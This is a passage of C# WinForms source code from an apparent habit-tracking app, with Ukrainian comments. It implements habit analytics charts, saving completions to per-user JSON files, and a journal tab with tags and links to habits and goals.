                    break;
                case AnalyticsMode.Habits:
                    await LoadHabitAnalyticsAsync();
                    break;
            }
        }
        private async Task LoadHabitAnalyticsAsync()
        {
            try
            {
                var habits = LoadHabits(false);
                var trackingData = LoadHabitTracking();
                var statsList = new List<HabitStatistics>();

                foreach (var habit in habits)
                {
                    var stat = new HabitStatistics
                    {
                        HabitName = habit.Title,
                        CompletedDates = trackingData
                            .Where(t => t.HabitId == habit.Id && t.IsCompleted)
                            .Select(t => t.CompletionDate.Date)
                            .ToList()
                    };
                    statsList.Add(stat);
                }

                await UpdateHabitAnalyticsUIAsync(statsList);
            }
            catch (Exception ex)
            {
                NotificationManager.AddNotification("Error loading habits analytics: " + ex.Message, null);
            }
        }

        private async Task UpdateHabitAnalyticsUIAsync(List<HabitStatistics> statsList)
        {
            if (InvokeRequired)
            {
                Invoke(new Action(async () => await UpdateHabitAnalyticsUIAsync(statsList)));
                return;
            }

            var mainPanel = tbPgAnalytics.Controls[0] as TableLayoutPanel;
            var chart = mainPanel?.Controls[1] as Chart;
            var progressBar = mainPanel?.Controls[2] as Guna2ProgressBar;
            var label = mainPanel?.Controls[3] as Label;
            if (chart == null || progressBar == null || label == null) return;
            chart.Series.Clear();

            
            Color[] palette =
            {
                Color.FromArgb(255, 99, 132),
                Color.FromArgb(54, 162, 235),
                Color.FromArgb(255, 206, 86)
            };

            // Додаємо серії для кожної звички
            for (int i = 0; i < statsList.Count; i++)
            {
                var stat = statsList[i];
                var series = new Series(stat.HabitName)
                {
                    ChartType = SeriesChartType.Line,
                    Color = palette[i % palette.Length],
                    BorderWidth = 2,
                    MarkerStyle = MarkerStyle.Circle,
                    MarkerSize = 8
                };

                foreach (var pair in stat.GetPerDayCount(14))
                {
                    series.Points.AddXY(pair.Key, pair.Value);
                }

                chart.Series.Add(series);
            }

            // Розраховуємо загальний прогрес
            int totalCompleted = statsList.Sum(s => s.GetCompletedCountLastDays(7));
            int totalExpected = statsList.Count * 7;
            int completionRate = totalExpected == 0 ? 0 : (int)((double)totalCompleted / totalExpected * 100);

            await AnimateProgressAsync(progressBar, completionRate);
            label.Text = totalExpected == 0
                ? "No habits to track"
                : $"Weekly completion: {completionRate}% ({totalCompleted}/{totalExpected})";

            // Оновлюємо підписи
            chart.ChartAreas[0].AxisX.Title = "Days";
            chart.ChartAreas[0].AxisY.Title = "Completed Times";

            chart.ChartAreas[0].AxisX.Interval = 1;
            chart.ChartAreas[0].AxisX.MajorGrid.Enabled = false;
            chart.ChartAreas[0].AxisY.MajorGrid.LineColor = Color.FromArgb(50, _currentTheme.Text);
        }
        private List<HabitTracking> LoadHabitTracking()
        {
            var result = new List<HabitTracking>();
            try
            {
                var userFolder = Path.Combine(_dataPath, _currentUserId.ToString());
                foreach (var file in Directory.GetFiles(userFolder, "Tracking_*.json"))
                {
                    string json = File.ReadAllText(file);
                    result.Add(JsonConvert.DeserializeObject<HabitTracking>(json));
                }
            }
            catch (Exception ex)
            {
                NotificationManager.AddNotification($"Error loading habit tracking: {ex.Message}", this);
            }
            return result;
        }

        // метод для збереження виконаних звичок
        public void CompleteHabit(int habitId)
        {
            try
            {
                var tracking = new HabitTracking
                {
                    HabitId = habitId,
                    CompletionDate = DateTime.Now,
                    IsCompleted = true,
                    TrackingId = GetNextTrackingId()
                };

                var userFolder = Path.Combine(_dataPath, _currentUserId.ToString());
                Directory.CreateDirectory(userFolder);

                string json = JsonConvert.SerializeObject(tracking, Formatting.Indented);
                string filePath = Path.Combine(userFolder, $"Tracking_{tracking.TrackingId}.json");
                File.WriteAllText(filePath, json);

                NotificationManager.AddNotification("Habit completed!", this);
                _ = SendDataToServerAsync();
            }
            catch (Exception ex)
            {
                NotificationManager.AddNotification($"Error completing habit: {ex.Message}", this);
            }
        }
        private int GetNextTrackingId()
        {
            var existing = LoadHabitTracking();
            return existing.Count > 0 ? existing.Max(t => t.TrackingId) + 1 : 1;
        }
        #endregion

        #region Journal Tab
        private void InitializeJournalTab()
        {
            tbPgJournal.Controls.Clear();

            var mainPanel = new TableLayoutPanel
            {
                Dock = DockStyle.Fill,
                RowCount = 2,
                BackColor = _currentTheme.Background,
                RowStyles =
                {
                    new RowStyle(SizeType.Absolute, 200),
                    new RowStyle(SizeType.Percent, 100)
                }
            };

            // Панель вводу
            var inputPanel = new Panel { Dock = DockStyle.Fill, BackColor = _currentTheme.ControlBackground };

            rtbJournal = new RichTextBox
            {
                Dock = DockStyle.Fill,
                Font = new Font("Bahnschrift Condensed", 10),
                Margin = new Padding(5),
                BackColor = _currentTheme.Background,
                ForeColor = _currentTheme.Text,
                BorderStyle = BorderStyle.FixedSingle
            };

            var controlsPanel = new FlowLayoutPanel
            {
                Dock = DockStyle.Bottom,
                Height = 40,
                FlowDirection = FlowDirection.LeftToRight,
                BackColor = _currentTheme.ControlBackground
            };

            cmbLinkHabits = new Guna2ComboBox
            {
                Width = 150,
                DataSource = LoadHabits(false),
                DisplayMember = "Title",
                BackColor = _currentTheme.Background,
                ForeColor = _currentTheme.Text,
                FillColor = _currentTheme.Secondary,
                BorderColor = _currentTheme.Secondary,
                HoverState = {
                    BorderColor = _currentTheme.Accent,
                    FillColor = _currentTheme.Secondary
                },
                Font = new Font("Bahnschrift Condensed", 9)
            };

            cmbLinkGoals = new Guna2ComboBox
            {
                Width = 150,
                DataSource = LoadGoals(false),
                DisplayMember = "Title",
                BackColor = _currentTheme.Background,
                ForeColor = _currentTheme.Text,
                FillColor = _currentTheme.Secondary,
                BorderColor = _currentTheme.Secondary,
                HoverState = {
                    BorderColor = _currentTheme.Accent,
                    FillColor = _currentTheme.Secondary
                },
                Font = new Font("Bahnschrift Condensed", 9)
            };

            txtTags = new Guna2TextBox
            {
                Width = 200,
                PlaceholderText = "Tags ( , )",
                BackColor = _currentTheme.Background,
                ForeColor = _currentTheme.Text,
                BorderColor = _currentTheme.Secondary,
                HoverState = {
                    BorderColor = _currentTheme.Accent
                },
                PlaceholderForeColor = _currentTheme.Text
            };

            var btnSave = new Guna2Button
            {
                Text = "Save",
                Height = 48,
                Width = 80,
                FillColor = _currentTheme.Accent,
                ForeColor = _currentTheme.Text,
                Font = new Font("Bahnschrift Condensed", 9),
                TextAlign = HorizontalAlignment.Center
            };
            btnSave.Click += BtnSaveJournal_Click;

            controlsPanel.Controls.AddRange(new Control[] { cmbLinkHabits, cmbLinkGoals, txtTags, btnSave });
            inputPanel.Controls.Add(rtbJournal);
            inputPanel.Controls.Add(controlsPanel);

            // Список нотаток
            flpJournalEntries = new FlowLayoutPanel
            {
                Dock = DockStyle.Fill,
                AutoScroll = true,
                BackColor = _currentTheme.Background
            };

            mainPanel.Controls.Add(inputPanel, 0, 0);
            mainPanel.Controls.Add(flpJournalEntries, 0, 1);
            tbPgJournal.Controls.Add(mainPanel);

            LoadJournalEntries();
        }
        private void BtnSaveJournal_Click(object sender, EventArgs e)
        {
            var entry = new JournalEntry
            {
                Id = GetNextJournalId(),
                UserId = _currentUserId,
                EntryDate = DateTime.Now,
                Content = rtbJournal.Text,
                LinkedHabitIds = cmbLinkHabits.SelectedItem != null ?
                    new List<int> { ((Habit)cmbLinkHabits.SelectedItem).Id } :
                    new List<int>(),
                LinkedGoalIds = cmbLinkGoals.SelectedItem != null ?
                    new List<int> { ((Goal)cmbLinkGoals.SelectedItem).Id } :
                    new List<int>(),
                Tags = txtTags.Text.Split(new[] { ',' }, StringSplitOptions.RemoveEmptyEntries)
                    .Select(t => t.Trim()).ToList()
            };

            SaveJournalEntry(entry);
            LoadJournalEntries();
            ClearJournalInputs();
        }

        private int GetNextJournalId()
        {
            var entries = LoadJournalEntriesFromFile();
            return entries.Count > 0 ? entries.Max(e => e.Id) + 1 : 1;
        }

        private void SaveJournalEntry(JournalEntry entry)
        {
            var userFolder = Path.Combine(_dataPath, _currentUserId.ToString());
            Directory.CreateDirectory(userFolder);

            string path = Path.Combine(userFolder, $"Journal_{entry.Id}.json");
            File.WriteAllText(path, JsonConvert.SerializeObject(entry));
        }
        private void LoadJournalEntries()
        {
            flpJournalEntries.Controls.Clear();

            var habits = LoadHabits(false);
            var goals = LoadGoals(false);

            foreach (var entry in LoadJournalEntriesFromFile())
            {
                var entryPanel = new Panel
                {
                    Width = flpJournalEntries.Width - 35,
                    Height = 220,
                    Margin = new Padding(5),
                    BackColor = _currentTheme.ControlBackground,
                    ForeColor = _currentTheme.Text,
                    BorderStyle = BorderStyle.FixedSingle,
                    Tag = entry.Id
                };

                var btnDelete = new Button
                {
                    Font = new Font("Bahnschrift Condensed", 12, FontStyle.Bold),
                    ForeColor = _currentTheme.Text,
                    FlatStyle = FlatStyle.Flat,
                    Size = new Size(25, 25),
                    Location = new Point(entryPanel.Width - 30, 5),
                    Anchor = AnchorStyles.Top | AnchorStyles.Right,
                    Text = "×",
                    Tag = entry.Id
                };
                btnDelete.Click += DeleteJournalEntry_Click;
                entryPanel.Controls.Add(btnDelete);

                var lblDate = new Label
                {
                    Text = entry.EntryDate.ToString("dd.MM.yyyy HH:mm"),
                    Dock = DockStyle.Top,
                    Font = new Font("Bahnschrift Condensed", 9, FontStyle.Bold),
                    Height = 30,
                    ForeColor = _currentTheme.Text,
                    BackColor = _currentTheme.ControlBackground,
                    Padding = new Padding(5, 5, 30, 5)
                };

                var txtLinkedItems = new RichTextBox
                {
                    Dock = DockStyle.Top,
                    Height = 40,
                    ReadOnly = true,
                    BorderStyle = BorderStyle.None,
                    BackColor = _currentTheme.Secondary,
                    ForeColor = _currentTheme.Text,
                    Font = new Font("Bahnschrift Condensed", 9),
                    ScrollBars = RichTextBoxScrollBars.None
                };
                var linkedItems = new List<string>();
                foreach (var habitId in entry.LinkedHabitIds)
                {
                    var habit = habits.FirstOrDefault(h => h.Id == habitId);
                    if (habit != null) linkedItems.Add($"🏷️ {habit.Title}");
                }
                foreach (var goalId in entry.LinkedGoalIds)
                {
                    var goal = goals.FirstOrDefault(g => g.Id == goalId);
                    if (goal != null) linkedItems.Add($"🎯 {goal.Title}");
                }
                txtLinkedItems.Text = string.Join("   ", linkedItems);

                var txtContent = new RichTextBox
                {
                    Text = entry.Content,
                    Dock = DockStyle.Fill,
                    ReadOnly = true,
                    BorderStyle = BorderStyle.None,
                    BackColor = _currentTheme.Background,
                    ForeColor = _currentTheme.Text,
                    Font = new Font("Bahnschrift Condensed", 10),
                    ScrollBars = RichTextBoxScrollBars.Vertical
                };

                var tagsPanel = new FlowLayoutPanel
                {
                    Dock = DockStyle.Bottom,
                    Height = 30,
                    FlowDirection = FlowDirection.LeftToRight,
                    Padding = new Padding(5, 0, 5, 5),
                    BackColor = _currentTheme.ControlBackground
                };

                foreach (var tag in entry.Tags)
                {
                    tagsPanel.Controls.Add(new Label
                    {
                        Text = $"#{tag}",
                        ForeColor = Color.SteelBlue,
                        Font = new Font("Bahnschrift Condensed", 8, FontStyle.Italic),
                        Margin = new Padding(0, 0, 5, 0)
                    });
                }

                entryPanel.Controls.Add(txtContent);
                entryPanel.Controls.Add(txtLinkedItems);
                entryPanel.Controls.Add(tagsPanel);
                entryPanel.Controls.Add(lblDate);

                flpJournalEntries.Controls.Add(entryPanel);
            }
        }

        private async void DeleteJournalEntry_Click(object sender, EventArgs e)
        {
            var result = MessageBox.Show("Delete this note?", "Agree",
                MessageBoxButtons.YesNo, MessageBoxIcon.Question);

            if (result != DialogResult.Yes) return;

            var button = (Button)sender;
            int entryId = (int)button.Tag;

            try
            {
                var filePath = Path.Combine(
                    _dataPath,
                    _currentUserId.ToString(),
                    $"Journal_{entryId}.json"
                );

                if (File.Exists(filePath))
                {
                    File.Delete(filePath);
                    await Task.Delay(100);

                    var entryPanel = (Panel)button.Parent;
                    flpJournalEntries.Controls.Remove(entryPanel);
                }
            }
            catch (Exception ex)
            {
                NotificationManager.AddNotification($"Deleting error: {ex.Message}", this);
            }
        }

        private List<JournalEntry> LoadJournalEntriesFromFile()
        {
            var entries = new List<JournalEntry>();
            var userFolder = Path.Combine(_dataPath, _currentUserId.ToString());

            if (Directory.Exists(userFolder))
            {
                foreach (var file in Directory.GetFiles(userFolder, "Journal_*.json"))
                {
                    string json = File.ReadAllText(file);
                    entries.Add(JsonConvert.DeserializeObject<JournalEntry>(json));
                }
            }

            return entries.OrderByDescending(e => e.EntryDate).ToList();
        }
        private void ClearJournalInputs()
        {
            rtbJournal.Clear();
            cmbLinkHabits.SelectedIndex = -1;
            cmbLinkGoals.SelectedIndex = -1;
            txtTags.Clear();
        }
        private Label CreateLinkedLabel(string text, Color color)
        {
            return new Label
            {
                Text = text,
                ForeColor = color,
                Font = new Font("Bahnschrift Condensed", 8, FontStyle.Regular),
                AutoSize = true,
                Margin = new Padding(0, 0, 10, 0),
                Padding = new Padding(3),
                BackColor = Color.Lavender,
                BorderStyle = BorderStyle.FixedSingle
            };
        }
        private void UpdateJournalTabTheme()
        {
            if (tbPgJournal == null) return;

            tbPgJournal.BackColor = _currentTheme.Background;
            tbPgJournal.ForeColor = _currentTheme.Text;

            if (cmbLinkHabits != null)
            {
                cmbLinkHabits.BackColor = _currentTheme.Background;
                cmbLinkHabits.ForeColor = _currentTheme.Text;
                cmbLinkHabits.FillColor = _currentTheme.Secondary;
            }

            if (cmbLinkGoals != null)
            {
                cmbLinkGoals.BackColor = _currentTheme.Background;
                cmbLinkGoals.ForeColor = _currentTheme.Text;
                cmbLinkGoals.FillColor = _currentTheme.Secondary;
            }

            if (txtTags != null)
            {
                txtTags.BackColor = _currentTheme.Background;
                txtTags.ForeColor = _currentTheme.Text;
                txtTags.BorderColor = _currentTheme.Secondary;
            }

            var btnSave = tbPgJournal.Controls
                .OfType<Guna2Button>()
                .FirstOrDefault(b => b.Text == "Save");
            if (btnSave != null)
            {
                btnSave.FillColor = _currentTheme.Accent;
                btnSave.ForeColor = _currentTheme.Text;
            }

            LoadJournalEntries();
        }
        #endregion

        private async void guna2TbCtrlMain_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (guna2TbCtrlMain.SelectedTab == null) return;

            switch (guna2TbCtrlMain.SelectedTab.Name)
            {
                case "tbPgHabits":
                    LoadHabitsToUI();
                    break;

                case "tbPgGoals":
                    LoadGoalsToUI();
                    break;

                case "tbPgAnalytics":
                    await RefreshAnalytics();
                    break;

                case "tbPgJournal":
                    LoadJournalEntries();
                    break;
            }
        }

        private void MainForm_Resize(object sender, EventArgs e)
        {
            flwLtPnlNotifications.Size = new Size(flwLtPnlNotifications.Width, flwLtPnlNotifications.Height + (flwLtPnlNotifications.Location.Y - 46));

            var num = (tbPgSettings.Size.Width - 578) / 2;
            guna2GrpBxGlobal.Location = new Point(num, 188);
            guna2GroupBox1.Location = new Point(351 + num, 188);
        }

        private void MainForm_Load(object sender, EventArgs e)
        {

        }
    }
}
